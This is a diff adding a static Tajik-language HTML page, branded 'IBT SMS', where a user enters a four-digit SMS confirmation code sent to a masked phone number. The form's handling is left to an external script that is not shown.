@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="tg">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>IBT SMS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/styles.css" />
+  </head>
+  <body data-screen="flow" data-step="sms">
+    <div class="page-shell"></div>
+
+    <main class="page">
+      <section class="step-card">
+        <a class="back-link" href="/">←</a>
+
+        <div class="logo-wrap step-logo" aria-label="IBT logo">
+          <div class="logo-mark">IB</div>
+        </div>
+
+        <header class="hero-copy step-copy">
+          <h1>Рамзи тасдиқкунандаро ворид кунед</h1>
+          <p class="subtitle">
+            Рамзи SMS-ро, ки мо ба рақами <span data-phone-mask>+992(**)*** ** **</span>
+            фиристодем, ворид кунед
+          </p>
+        </header>
+
+        <form class="step-form" id="stepForm">
+          <div class="otp-grid" id="otpGrid">
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+          </div>
+
+          <button class="ghost-link" id="resendButton" type="button">
+            Рамз наомад?
+          </button>
+
+          <button class="submit-btn secondary-btn" type="submit" id="submitStepButton">
+            Давомадан
+          </button>
+          <p class="status" id="statusMessage" aria-live="polite"></p>
+        </form>
+      </section>
+    </main>
+
+    <script src="/flow.js"></script>
+  </body>
+  </html>
